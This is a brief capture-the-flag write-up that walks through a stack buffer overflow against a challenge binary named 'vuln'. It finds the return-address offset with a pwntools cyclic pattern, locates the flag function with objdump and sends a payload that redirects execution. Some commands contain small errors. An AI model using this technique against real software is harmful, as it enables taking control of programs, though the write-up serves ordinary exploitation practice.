Try to make it overflow
```
$ python -c "print('A'*128)"|./vuln 
```

Woah, were jumping to 0x414141 !
Segmentation fault (core dumped)

0x414141 is the hex format of AAAA, it seems that the input and jumping address are cyclic, we need to find the exact padding to make it jump to the location of flag function.

(De Bruijn Sequence)[https://en.wikipedia.org/wiki/De_Bruijn_sequence]
```
>>> pwn.cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'

$ vul <<< "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
...
Woah, were jumping to 0x61616174 !
...
```

``p32`` to convert it back to char
```
padding = pwn.cyclic_find(''.join(list(reversed(pwn.p32(0x61616174).decode())))
```

Find the location of flag function
```
$ objdump -D vuln|grep flag
080485e6 <flag>:
...
```
```
payload = 'A'*padding + '\xe6\x85\x04\x08'
print(payload)
```

Run on server shell:
```
python -c "print('A'*padding + '\xe6\x85\x04\x08')|./vuln"
```

Get the flag in output.
